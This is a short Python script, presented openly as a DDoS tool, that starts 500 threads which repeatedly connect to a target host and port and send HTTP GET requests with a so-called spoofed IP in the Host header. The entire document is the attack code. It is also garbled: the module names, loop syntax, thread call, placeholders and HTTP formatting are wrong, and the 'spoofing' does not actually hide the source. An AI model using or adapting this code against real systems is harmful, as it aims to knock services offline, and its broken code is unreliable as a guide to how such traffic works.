'''
Python script for performing DDoS attacks from a single host
'''

# Import needed modules.

import threading
import sockets

target_host = <target name>
target_port = <port #>
spoofed_ip = <spoofed_ip>

already_connected = 0

'''
Define function for DDoS and establish while Loop to maintain connection.
'''

def ddos():
  while True():
    # Create socket object.

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))
    s.sendto(('GET /' + target_host + ' HTTP 1.1/\r\n').encode('ascii'), (target_host, target_port))
    s.sendto(('Host: ' + spoofed_ip + ' \n\r\n\r').encode('ascii'), (target_host, target_port))
    s.close()
    
    global already_connected
    already_connected += 1
    print(already_connected)
    
for i in range(500):
  thread = threading.thread(target=ddos)
  thread.start()
    
